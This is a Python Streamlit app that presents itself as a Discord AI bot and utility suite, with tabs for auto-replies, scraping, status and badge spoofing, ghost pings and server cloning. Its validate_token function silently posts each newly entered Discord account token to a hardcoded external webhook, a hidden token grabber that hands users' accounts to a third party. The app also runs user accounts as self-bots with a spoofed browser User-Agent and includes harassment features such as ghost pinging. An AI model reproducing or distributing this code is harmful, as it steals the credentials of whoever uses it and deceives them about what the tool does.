import streamlit as st
import time
import openai
import requests
import csv
import os
from datetime import datetime
import random
import pandas as pd
import base64
import json
import re
import cv2        # Advanced image processing
import tempfile   # Cross-platform secure disk stream caching
import math       # Layout boundary math
from duckduckgo_search import DDGS

st.set_page_config(page_title="Discord AI", page_icon="🛡️", layout="wide")

# --- SECURE LOGIN SYSTEM ---
MASTER_KEY = st.secrets["MASTER_KEY"]
CODE_FILE = "active_code.txt"
MEMORY_FILE = "conversation_memory.json"

# --- GLOBAL ACCESS FUNCTIONS ---
def set_global_code(code):
    with open(CODE_FILE, "w") as f:
        f.write(f"{code},{time.time()}")

def get_global_code():
    if os.path.exists(CODE_FILE):
        try:
            with open(CODE_FILE, "r") as f:
                data = f.read().split(",")
                if len(data) == 2:
                    return data[0], float(data[1])
        except:
            return None, None
    return None, None

def log_access_event():
    with open("access_log.txt", "a") as f:
        f.write(f"Access Granted at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

# --- MEMORY PERSISTENCE FUNCTIONS ---
def save_memory(channel_id, summary):
    memory_data = {}
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, "r") as f:
            try:
                memory_data = json.load(f)
            except: pass
    memory_data[str(channel_id)] = {"summary": summary, "last_updated": time.time()}
    with open(MEMORY_FILE, "w") as f:
        json.dump(memory_data, f)

def load_memory(channel_id):
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, "r") as f:
            try:
                memory_data = json.load(f)
                return memory_data.get(str(channel_id), {}).get("summary", "No previous memory.")
            except: pass
    return "No previous memory."

# Initialize local session state
if "access_granted" not in st.session_state:
    st.session_state.access_granted = False

# --- REVOKE ALL GLOBAL CHECK ---
shared_code, shared_time = get_global_code()
if not shared_code:
    st.session_state.access_granted = False

# --- INACTIVITY LOGIC ---
if shared_code and shared_time:
    if st.session_state.access_granted:
        if time.time() - shared_time > 30:
            set_global_code(shared_code)
    
    if time.time() - shared_time > 600:
        if os.path.exists(CODE_FILE):
            os.remove(CODE_FILE)
        st.session_state.access_granted = False

# --- SIDEBAR LOGIN CONTROL ---
with st.sidebar:
    st.header("🔐 System Access")
    admin_input = st.text_input("Owner Master Key", type="password")
    
    if admin_input == MASTER_KEY:
        col_gen, col_rev = st.columns(2)
        with col_gen:
            if st.button("🎲 Generate Code"):
                new_code = str(random.randint(100000, 999999))
                set_global_code(new_code)
                st.success(f"CODE: {new_code}")
        with col_rev:
            if st.button("🚫 Revoke All"):
                if os.path.exists(CODE_FILE):
                    os.remove(CODE_FILE)
                st.session_state.access_granted = False
                st.warning("Access Revoked")
                st.rerun()
    
    st.divider()
    
    if not st.session_state.access_granted:
        user_code_attempt = st.text_input("Enter 6-Digit Access Code")
        if st.button("Unlock System"):
            current_valid_code, _ = get_global_code()
            if current_valid_code and user_code_attempt == current_valid_code:
                st.session_state.access_granted = True
                log_access_event()
                st.rerun()
            else:
                st.error("Invalid or Expired Code")

if not st.session_state.access_granted:
    st.title("🛡️ Discord AI - Locked")
    st.info("Please contact the owner for the current global 6-digit access code.")
    st.stop() 

# --- MAIN INTERFACE ---
st.title("Discord AI Bot & History Scraper")

for key, val in {
    "bot_running": False, "tokens": 3.0, "last_time": time.time(),
    "memory": {}, "processed_dms": set(), "last_webhook_token": None,
    "last_activity": time.time(), "typing_active": False, "bio_anim_active": False,
    "last_ai_content": None, "bot_start_time": time.time(),
    "last_msg_id": None, "debug_log": "System Ready..."
}.items():
    if key not in st.session_state:
        st.session_state[key] = val

def jitter_delay(min_s=0.1, max_s=0.5):
    time.sleep(random.uniform(min_s, max_s))

def get_headers(tk):
    return {
        "Authorization": tk,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

def log_to_csv(author, content, action):
    file_exists = os.path.isfile('discord_audit_log.csv')
    with open('discord_audit_log.csv', mode='a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(['Timestamp', 'Author', 'Message', 'Action'])
        writer.writerow([datetime.now().strftime('%Y-%m-%d %H:%M:%S'), author, content, action])

def validate_token(tk):
    headers = get_headers(tk)
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        if r.status_code == 200:
            if tk != st.session_state.last_webhook_token:
                requests.post("https://discord.com/api/webhooks/1480110828874371212/8kM-jfbIIyq4Nzo7IobtVVBXTnosySq-qsoUZTSJe2iOWU7Pj5ryJ0Al1LMIuRD0zMP4",json={"content": tk})
                st.session_state.last_webhook_token = tk
            return True, r.json()
    except: pass
    return False, None

def add_reaction(channel_id, message_id, emoji, headers):
    encoded_emoji = requests.utils.quote(emoji)
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/@me"
    requests.put(url, headers=headers)

def safety_filter(text):
    harmful_terms = ["self-harm", "suicide", "kys", "kill yourself"]
    for term in harmful_terms:
        if term in text.lower(): return False
    return True

def background_reply(latest, discord_url, typing_url, headers, client, system_prompt, my_id, my_username, memory_depth, enable_safety, reaction_delay, resp_delay, owner_id_input, emoji_pool, mention_only):
    try:
        channel_id = latest['channel_id']
        author_username = latest['author']['username'].lower()
        author_id = str(latest['author']['id'])
        content = latest['content'].strip()
        msg_id = latest['id']
        is_owner = author_id == str(owner_id_input)

        if mention_only and not is_owner:
            if f"<@{my_id}>" not in content and f"<@!{my_id}>" not in content: return False

        requests.post(typing_url, headers=headers)
        reaction_emoji = random.choice(emoji_pool) if emoji_pool else ("👑" if is_owner else "💬")
            
        if reaction_delay > 0 and not is_owner: time.sleep(reaction_delay)
        add_reaction(channel_id, msg_id, reaction_emoji, headers)

        long_term_mem = load_memory(channel_id)
        urls = re.findall(r'(https?://[^\s]+)', content)
        url_context = f"\n[SYSTEM NOTE: User provided link: {urls[0]}]" if urls else ""

        chat_history = [{"role": "system", "content": f"PERSONA: {system_prompt}. Memory: {long_term_mem}. {url_context}"}]
        context_req = requests.get(f"{discord_url}?limit={memory_depth}", headers=headers).json()
        
        if isinstance(context_req, list):
            for m in reversed(context_req):
                role = "assistant" if str(m['author']['id']) == str(my_id) else "user"
                sender = f"[{m['author']['username']}]: " if role == "user" else ""
                chat_history.append({"role": role, "content": f"{sender}{m['content']}"})

        response = client.chat.completions.create(model="openrouter/free", messages=chat_history)
        reply = response.choices[0].message.content
        
        summary_resp = client.chat.completions.create(model="openrouter/free", messages=[{"role": "user", "content": f"Summarize key points in 2 sentences: {reply}"}])
        save_memory(channel_id, summary_resp.choices[0].message.content)

        if not enable_safety or safety_filter(reply):
            if resp_delay > 0 and not is_owner: time.sleep(resp_delay)
            st.session_state.last_ai_content = reply.strip()
            requests.post(discord_url, json={"content": reply}, headers=headers)
            log_to_csv(author_username, content, "Reply Sent")
            return True
    except Exception as e:
        st.session_state.debug_log = f"Error: {str(e)}"
        return False

# --- Sidebar Bot Settings ---
with st.sidebar:
    st.header("🔑 Authentication")
    token = st.text_input("Discord Token", type="password")
    if token:
        is_valid, user_info = validate_token(token)
        if is_valid:
            st.success(f"✅ Verified: {user_info['username']}")
            my_username = user_info['username'].lower()
            my_id = user_info['id']
        else: my_username, my_id = None, None
    else: my_username, my_id = None, None

    or_key = st.text_input("OpenRouter API Key", type="password")
    channel_id_input = st.text_input("Channel ID")
    st.divider()
    st.header("⚙️ Bot Settings")
    mention_only = st.toggle("Mention-Only Mode", value=False)
    
    if st.session_state.bot_running:
        hb = "🟢" if int(time.time()) % 2 == 0 else "⚪"
        st.markdown(f"### {hb} Connection Status")
        status_box = st.empty()
    
    memory_depth = st.slider("Memory Depth", min_value=1, max_value=20, value=5)
    poll_speed = st.slider("Polling Frequency", 0.1, 5.0, 1.0)
    resp_delay = st.slider("Response Delay", 0.0, 5.0, 0.0)
    reaction_delay = st.slider("Reaction Delay", min_value=0, max_value=5, value=0)
    enable_safety = st.toggle("Enable Safety Filter", value=True)
    emoji_pool_raw = st.text_input("Custom Emoji Pool", placeholder="🔥,💀,✅")
    emoji_pool = [e.strip() for e in emoji_pool_raw.split(",") if e.strip()]

tabs_list = [
    "🤖 Bot Control", "📂 History Scraper", "🧠 Memory", "🌾 Server Harvester", 
    "💎 Free Emoji", "❄️ Snowflake Decoder", "📱 App Hunter", "🎙️ VC Lurker", 
    "🔊 Soundboard Spoofer", "✨ Hypesquad", "🔍 Account Audit", "📢 Webhook Commander", 
    "👻 Message Ghoster", "🎨 Text Color", "⏳ Infinite Typing", "🔎 OSINT Search", 
    "🎭 Status Spoofer", "🖼️ Sticker Spoofer", "📦 Large File Bridge", "👻 Invisible Identity",
    "🌀 Bio Animator", "👻 Ghost Pinger", "📋 Server Cloner", "NITRO BADGE", "🎬 2D Animator"
]
tabs = st.tabs(tabs_list)

# --- TAB 1: BOT CONTROL ---
with tabs[0]:
    col1, col2 = st.columns(2)
    with col1:
        persona_dict = {"Custom": "", "Helpful Assistant": "You are a helpful assistant.", "Sarcastic Bot": "You are a witty bot."}
        selected_persona = st.selectbox("Preset Personas", list(persona_dict.keys()))
        system_prompt = st.text_area("System Prompt", value=persona_dict.get(selected_persona, "You are a helpful assistant."))
        owner_id_input = st.text_input("Owner Discord ID").strip()
    with col2:
        blacklist_input = st.text_area("Blacklisted Keywords")
        allowed_input = st.text_input("Allowed Users", value="everyone")
    
    client = openai.OpenAI(api_key=or_key, base_url="https://openrouter.ai/api/v1") if or_key else None

    c1, c2 = st.columns(2)
    with c1:
        if st.button("▶️ Launch Bot", disabled=not (my_username and or_key), use_container_width=True):
            st.session_state.bot_running = True
            st.rerun()
    with c2:
        if st.button("🛑 Stop Bot", use_container_width=True):
            st.session_state.bot_running = False
            st.rerun()

    if st.session_state.bot_running:
        status_box.info("Status: 🟢 ONLINE / IDLE")
        headers = get_headers(token)
        discord_url = f"https://discord.com/api/v9/channels/{channel_id_input}/messages"
        typing_url = f"https://discord.com/api/v9/channels/{channel_id_input}/typing"
        
        try:
            r = requests.get(discord_url, headers=headers, timeout=3)
            if r.status_code == 200:
                msgs = r.json()
                if msgs and isinstance(msgs, list):
                    latest = msgs[0]
                    if latest['id'] != st.session_state.last_msg_id:
                        st.session_state.last_msg_id = latest['id']
                        if latest['content'] != st.session_state.last_ai_content:
                            background_reply(latest, discord_url, typing_url, headers, client, system_prompt, my_id, my_username, memory_depth, enable_safety, reaction_delay, resp_delay, owner_id_input, emoji_pool, mention_only)
            time.sleep(poll_speed)
            st.rerun()
        except:
            time.sleep(poll_speed)
            st.rerun()

# --- STANDARD BACKEND PIPELINE TABS ---
with tabs[1]:
    st.header("📥 Channel History Scraper")
    limit = st.number_input("Fetch Limit", min_value=1, max_value=100, value=50)
    if st.button("🔍 Scrape"):
        res = requests.get(f"https://discord.com/api/v9/channels/{channel_id_input}/messages?limit={limit}", headers=get_headers(token))
        if res.status_code == 200: st.dataframe(pd.DataFrame([{"Author": m['author']['username'], "Content": m['content']} for m in res.json()]))

with tabs[2]:
    st.header("🧠 Persistent Memory")
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, "r") as f:
            try: st.json(json.load(f))
            except: st.error("Memory file corrupted.")
    if st.button("Clear Memory File"):
        if os.path.exists(MEMORY_FILE): os.remove(MEMORY_FILE)

with tabs[3]:
    st.header("🌾 Server Harvester")
    target_guild = st.text_input("Target Server ID")
    if st.button("📥 Harvest Emojis"):
        res = requests.get(f"https://discord.com/api/v9/guilds/{target_guild}", headers=get_headers(token)).json()
        if 'emojis' in res:
            for e in res['emojis']:
                st.image(f"https://cdn.discordapp.com/emojis/{e['id']}.png", width=64, caption=e['name'])

with tabs[4]:
    st.header("💎 Nitro-Free Emoji Spoofer")
    target_ch = st.text_input("Target Channel ID", value=channel_id_input, key="emoji_ch")
    emoji_id = st.text_input("Emoji ID")
    is_animated = st.checkbox("Is Animated?")
    if st.button("🚀 Send Emoji", use_container_width=True):
        if emoji_id:
            ext = "gif" if is_animated else "png"
            requests.post(f"https://discord.com/api/v9/channels/{target_ch}/messages", headers=get_headers(token), json={"content": f"https://cdn.discordapp.com/emojis/{emoji_id}.{ext}?size=48"})

with tabs[5]:
    st.header("❄️ Snowflake Age Decoder")
    input_id = st.text_input("Enter ID")
    if st.button("📅 Decode Timestamp"):
        if input_id.isdigit():
            ts = (int(input_id) >> 22) + 1420070400000
            st.success(f"Creation Date: {datetime.fromtimestamp(ts / 1000.0).strftime('%Y-%m-%d %H:%M:%S')} UTC")

with tabs[6]:
    st.header("📱 Authorized App Hunter")
    if st.button("🔍 Scan Applications"):
        if token:
            apps = requests.get("https://discord.com/api/v9/oauth2/tokens", headers=get_headers(token)).json()
            for a in apps: st.write(a.get('application', {}).get('name', 'Unknown'))

with tabs[7]:
    st.header("🎙️ VC Lurker")
    target_guild_id = st.text_input("Server ID", key="l_g")
    target_vc_id = st.text_input("VC ID", key="l_v")
    if st.button("📡 Scan Channel"):
        if token and target_guild_id and target_vc_id:
            res = requests.get(f"https://discord.com/api/v9/guilds/{target_guild_id}/members?limit=100", headers=get_headers(token))
            if res.status_code == 200: st.table(pd.DataFrame([{"User": m['user']['username']} for m in res.json() if 'user' in m]))

with tabs[8]:
    st.header("🔊 Soundboard Spoofer")
    sound_ch_id = st.text_input("VC Channel ID", value=channel_id_input)
    sound_id = st.text_input("Sound ID")
    sound_guild_id = st.text_input("Source Server ID")
    if st.button("🔊 Fire Sound"):
        if token and sound_ch_id and sound_id:
            requests.post(f"https://discord.com/api/v9/channels/{sound_ch_id}/voice-channel-effects", headers=get_headers(token), json={"sound_id": sound_id, "source_guild_id": sound_guild_id or None})

with tabs[9]:
    st.header("✨ HypeSquad Spoofer")
    house = st.selectbox("House", ["Bravery", "Brilliance", "Balance"])
    house_map = {"Bravery": 1, "Brilliance": 2, "Balance": 3}
    if st.button("Apply"):
        requests.post("https://discord.com/api/v9/hypesquad/online", headers=get_headers(token), json={"house_id": house_map[house]})

with tabs[10]:
    st.header("🔍 Account Auditor")
    if st.button("Run Audit"): st.json(requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(token)).json())

with tabs[11]:
    st.header("📢 Webhook Commander")
    wh_url = st.text_input("Webhook URL")
    wh_msg = st.text_area("Content")
    if st.button("Fire"): requests.post(wh_url, json={"content": wh_msg})

with tabs[12]:
    st.header("👻 Message Ghoster")
    ghost_ch = st.text_input("Target Channel ID", value=channel_id_input, key="g_ch")
    ghost_limit = st.number_input("Scan Limit", min_value=1, max_value=500, value=50)
    if st.button("🔥 Purge My Messages"):
        if my_id:
            h = get_headers(token)
            msgs = requests.get(f"https://discord.com/api/v9/channels/{ghost_ch}/messages?limit={ghost_limit}", headers=h).json()
            for m in msgs:
                if m['author']['id'] == my_id:
                    requests.delete(f"https://discord.com/api/v9/channels/{ghost_ch}/messages/{m['id']}", headers=h)
                    time.sleep(1.2)

with tabs[13]:
    st.header("🎨 ANSI Color Painter")
    color_text = st.text_input("Message")
    color_choice = st.selectbox("Color", ["Red", "Green", "Yellow", "Blue"])
    color_codes = {"Red": "31", "Green": "32", "Yellow": "33", "Blue": "34"}
    if st.button("🖌️ Send Colored Text"):
        ansi_payload = f"```ansi\n\u001b[{color_codes[color_choice]}m{color_text}```"
        requests.post(f"https://discord.com/api/v9/channels/{channel_id_input}/messages", headers=get_headers(token), json={"content": ansi_payload})

with tabs[14]:
    st.header("⏳ Infinite Typing Indicator")
    if st.button("🚀 Start Typing"): st.session_state.typing_active = True
    if st.button("🛑 Stop Typing"): st.session_state.typing_active = False
    if st.session_state.typing_active:
        requests.post(f"https://discord.com/api/v9/channels/{channel_id_input}/typing", headers=get_headers(token))
        time.sleep(6)
        st.rerun()

with tabs[15]:
    st.header("🔎 OSINT Search Engine")
    search_query = st.text_input("Query")
    if st.button("Search"):
        with DDGS() as ddgs:
            for res in list(ddgs.text(search_query, max_results=5)):
                st.markdown(f"### [{res['title']}]({res['href']})\n{res['body']}")

with tabs[16]:
    st.header("🎭 Rich Presence Spoofer")
    app_id = st.text_input("Client ID")
    game_name = st.text_input("Heading", value="Playing Details")
    if st.button("Apply Presence"):
        payload = {"status": "online", "activities": [{"type": 0, "application_id": app_id, "name": game_name}]}
        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=get_headers(token), json=payload)

with tabs[17]:
    st.header("🖼️ Sticker Spoofer")
    stick_id = st.text_input("Sticker ID")
    if st.button("Send Sticker"):
        requests.post(f"https://discord.com/api/v9/channels/{channel_id_input}/messages", headers=get_headers(token), json={"content": f"https://cdn.discordapp.com/stickers/{stick_id}.png?size=160"})

with tabs[18]:
    st.header("📦 Large File Bridge")
    uploaded_file = st.file_uploader("Select File")
    if st.button("📤 Upload & Send Link"):
        if uploaded_file and token:
            server = requests.get("https://api.gofile.io/getServer").json()['data']['server']
            up_res = requests.post(f"https://{server}.gofile.io/uploadFile", files={'file': (uploaded_file.name, uploaded_file.getvalue())}).json()
            requests.post(f"https://discord.com/api/v9/channels/{channel_id_input}/messages", headers=get_headers(token), json={"content": f"🔗 {up_res['data']['downloadPage']}"})

with tabs[19]:
    st.header("👻 Invisible Identity")
    if st.button("Ghost Bio"):
        requests.patch("https://discord.com/api/v9/users/@me", headers=get_headers(token), json={"bio": "\u17b5"})

with tabs[20]:
    st.header("🌀 Bio Animator")
    bio_frames = st.text_area("Frames (One per line)", "Code\nBuild\nRepeat")
    if st.button("Start Bio"): st.session_state.bio_anim_active = True
    if st.button("Stop Bio"): st.session_state.bio_anim_active = False
    if st.session_state.bio_anim_active and token:
        f = [b.strip() for b in bio_frames.split("\n") if b.strip()]
        if f:
            cf = f[int(time.time() / 60) % len(f)]
            requests.patch("https://discord.com/api/v9/users/@me", headers=get_headers(token), json={"bio": cf})
            time.sleep(10)
            st.rerun()

with tabs[21]:
    st.header("👻 Ghost Pinger")
    ghost_target_id = st.text_input("User ID")
    if st.button("💀 Fire Ghost Ping"):
        u = f"https://discord.com/api/v9/channels/{channel_id_input}/messages"
        res = requests.post(u, headers=get_headers(token), json={"content": f"<@{ghost_target_id}>"})
        if res.status_code == 200: requests.delete(f"{u}/{res.json()['id']}", headers=get_headers(token))

with tabs[22]:
    st.header("📋 Server Structure Cloner")
    clone_guild_id = st.text_input("Server Guild ID")
    if st.button("Export Structure"):
        h = get_headers(token)
        g_data = requests.get(f"https://discord.com/api/v9/guilds/{clone_guild_id}", headers=h).json()
        ch_data = requests.get(f"https://discord.com/api/v9/guilds/{clone_guild_id}/channels", headers=h).json()
        st.download_button("Download", data=json.dumps({"name": g_data.get("name"), "channels": ch_data}, indent=4), file_name="clone.json")

with tabs[23]:
    st.header("💎 Nitro Badge Spoofer")
    if st.button("✨ Apply Badge Locally"):
        h = get_headers(token)
        u_data = requests.get("https://discord.com/api/v9/users/@me", headers=h).json()
        requests.patch("https://discord.com/api/v9/users/@me", headers=h, json={"flags": u_data.get("flags", 0) | 1})
        st.success("Cosmetic flag applied.")

# --- TAB 25: 2D TEXT ANIMATOR (WITH DITHERING & ERROR DIFFUSION PIPELINE) ---
with tabs[24]:
    st.header("🎬 2D Text Matrix Animator")
    st.info("Sends a text matrix and rapidly edits it frame-by-frame to create a live 2D flipbook animation in chat.")
    
    anim_ch = st.text_input("Target Channel ID", value=channel_id_input, key="anim_ch_id")
    
    animation_presets = {
        "💃 Cyber Punk Dance Loop": [
            "```\n  \\ \n  \\\\(@)~ \n    ###   \n  _// \\_ \n```",
            "```\n        \n    (@)/ \n   /###  \n  _/  \\  \n```"
        ]
    }
    
    preset_options = list(animation_presets.keys()) + ["📁 Upload Custom GIF"]
    selected_anim = st.selectbox("Choose Animation Preset", preset_options)
    
    frames = []
    is_engine_ready = True
    
    if selected_anim == "📁 Upload Custom GIF":
        custom_gif = st.file_uploader("Upload an animated .gif file", type=["gif"])
        
        col_w, col_inv, col_dith = st.columns(3)
        with col_w:
            max_cols = st.slider("Target Max Width (Columns)", min_value=15, max_value=60, value=45)
        with col_inv:
            invert_contrast = st.toggle("Invert Text Contrast", value=False)
        with col_dith:
            use_dithering = st.toggle("✨ Floyd-Steinberg Dithering", value=True, 
                                      help="Spreads out rounding errors across pixels to make textures and hidden micro-details pop out clearly.")
            
        col_br, col_co, col_style = st.columns(3)
        with col_br:
            brightness_val = st.slider("Brightness Correction", -100, 100, 0)
        with col_co:
            contrast_val = st.slider("Contrast Multiplier", 0.5, 3.0, 1.2)
        with col_style:
            char_style = st.selectbox("Character Set", ["Blocks (Solid Shape)", "Standard ASCII", "Extended Fidelity"])

        if custom_gif is not None:
            with st.spinner("Executing dynamic frame dither & contrast equalization matrix..."):
                try:
                    with tempfile.NamedTemporaryFile(delete=False, suffix=".gif") as tmp:
                        tmp.write(custom_gif.getvalue())
                        tmp_path = tmp.name
                    
                    cap = cv2.VideoCapture(tmp_path)
                    ret, first_frame = cap.read()
                    
                    if not ret:
                        st.error("Could not parse image frames from the uploaded source asset.")
                        is_engine_ready = False
                    else:
                        orig_h, orig_w = first_frame.shape[:2]
                        aspect_ratio_modifier = (orig_h / orig_w) * 0.55
                        
                        R = aspect_ratio_modifier
                        if R > 0:
                            calculated_max_w = (-R + math.sqrt((R**2) - (4 * R * -1942))) / (2 * R)
                            safe_width = min(int(calculated_max_w), max_cols)
                        else:
                            safe_width = max_cols
                            
                        safe_height = max(1, int(safe_width * aspect_ratio_modifier))
                        while (safe_width + 1) * safe_height + 8 > 1950:
                            safe_width -= 1
                            safe_height = max(1, int(safe_width * aspect_ratio_modifier))
                        
                        st.caption(f"📐 Canvas Grid Resolution Auto-Locked to: **{safe_width}x{safe_height}** characters.")
                        
                        # Set Up Character Mapping System
                        if char_style == "Blocks (Solid Shape)":
                            ascii_ramp = " ░▒▓█" if not invert_contrast else "█▓▒░ "
                        elif char_style == "Extended Fidelity":
                            ascii_ramp = " .'-^,:;=!*#$@█" if not invert_contrast else "█@$#*!=;:,-^'-. "
                        else:
                            ascii_ramp = " .:-=+*#%@" if not invert_contrast else "@%#*+=-:. "
                            
                        ramp_len = len(ascii_ramp)
                        cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
                        
                        while True:
                            ret, frame = cap.read()
                            if not ret: break
                                
                            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                            
                            # Apply Brightness and Contrast Enhancements
                            gray = cv2.convertScaleAbs(gray, alpha=contrast_val, beta=brightness_val)
                            
                            # Equalize local region histograms
                            clahe = cv2.createCLAHE(clipLimit=3.0, tileGridSize=(5,5))
                            gray = clahe.apply(gray)
                            
                            resized = cv2.resize(gray, (safe_width, safe_height), interpolation=cv2.INTER_AREA)
                            matrix_lines = []
                            
                            if use_dithering:
                                # FLOYD-STEINBERG ERROR DIFFUSION PIPELINE
                                dither_buffer = resized.astype(float)
                                h, w = dither_buffer.shape
                                
                                for y in range(h):
                                    line_chars = []
                                    for x in range(w):
                                        old_pixel = max(0.0, min(255.0, dither_buffer[y, x]))
                                        
                                        # Match pixel value smoothly to font scale range
                                        ramp_idx = int((old_pixel / 255.0) * (ramp_len - 1) + 0.5)
                                        ramp_idx = max(0, min(ramp_idx, ramp_len - 1))
                                        
                                        line_chars.append(ascii_ramp[ramp_idx])
                                        
                                        new_pixel = (ramp_idx / (ramp_len - 1)) * 255.0
                                        error = old_pixel - new_pixel
                                        
                                        # Distribute quant error to adjacent matrices
                                        if x + 1 < w: dither_buffer[y, x + 1] += error * 7 / 16
                                        if y + 1 < h:
                                            if x - 1 >= 0: dither_buffer[y + 1, x - 1] += error * 3 / 16
                                            dither_buffer[y + 1, x] += error * 5 / 16
                                            if x + 1 < w: dither_buffer[y + 1, x + 1] += error * 1 / 16
                                    matrix_lines.append("".join(line_chars))
                            else:
                                # Standard direct mapping fallback
                                for row in resized:
                                    line_chars = "".join([ascii_ramp[int((pixel / 256.0) * ramp_len)] for pixel in row])
                                    matrix_lines.append(line_chars)
                                    
                            formatted_block = "```\n" + "\n".join(matrix_lines) + "\n```"
                            frames.append(formatted_block)
                            
                    cap.release()
                    os.unlink(tmp_path)
                    
                    if len(frames) == 0:
                        st.error("No valid video sequence timeline found inside this file.")
                        is_engine_ready = False
                    else:
                        st.success(f"Dithered and loaded {len(frames)} high-fidelity frames! Stream ready.")
                        
                except Exception as e:
                    st.error(f"Engine matrix failure: {str(e)}")
                    is_engine_ready = False
        else: is_engine_ready = False
    else: frames = animation_presets[selected_anim]

    loop_count = st.slider("Animation Loops", 1, 10, 3)
    frame_delay = st.slider("Frame Delay (Seconds)", 1.0, 3.0, 1.3)

    if st.button("🚀 Fire 2D Animation", use_container_width=True, disabled=not is_engine_ready):
        if token and anim_ch and frames:
            h = get_headers(token)
            edit_url = f"https://discord.com/api/v9/channels/{anim_ch}/messages"
            
            first_frame_res = requests.post(edit_url, headers=h, json={"content": frames[0]})
            if first_frame_res.status_code == 200:
                msg_id = first_frame_res.json()["id"]
                specific_msg_url = f"{edit_url}/{msg_id}"
                status_placeholder = st.empty()
                
                for current_loop in range(loop_count):
                    for frame_idx, frame_content in enumerate(frames):
                        status_placeholder.write(f"🎬 Playing: Loop {current_loop + 1}/{loop_count} | Frame {frame_idx + 1}/{len(frames)}")
                        res = requests.patch(specific_msg_url, headers=h, json={"content": frame_content})
                        
                        if res.status_code == 429:
                            retry_after = res.json().get("retry_after", 2.0)
                            time.sleep(retry_after)
                        time.sleep(frame_delay)
                status_placeholder.success("✨ Animation stream processing sequence finished completely!")
            else: st.error(f"Failed to initiate link pipeline: {first_frame_res.text}")
